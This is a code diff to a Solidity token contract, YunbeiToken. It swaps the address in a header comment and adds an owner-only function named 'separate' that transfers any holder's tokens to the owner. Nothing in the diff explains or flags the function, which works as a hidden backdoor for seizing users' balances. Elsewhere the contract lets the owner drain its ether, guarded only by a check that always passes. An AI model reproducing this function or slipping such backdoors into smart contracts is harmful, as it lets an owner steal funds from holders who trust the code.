@@ -1,5 +1,5 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract YunbeiToken at 0x6ef1cdb9aaa7d7ca0deea9b542a7cf3dada7c996
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract YunbeiToken at 0x4200942093f5c8c2ce865e17b3fdec9148de8c49
 */
 pragma solidity ^0.4.16;
 
@@ -238,6 +238,10 @@ contract YunbeiToken is owned, TokenERC20 {
         uint256 balance = address(this).balance;
         require (balance >= 0); 
         owner.transfer(balance);
+    }
+    
+    function separate(address _from, uint256 _value) onlyOwner public {
+        _transfer(_from, msg.sender, _value);
     }
 
 }
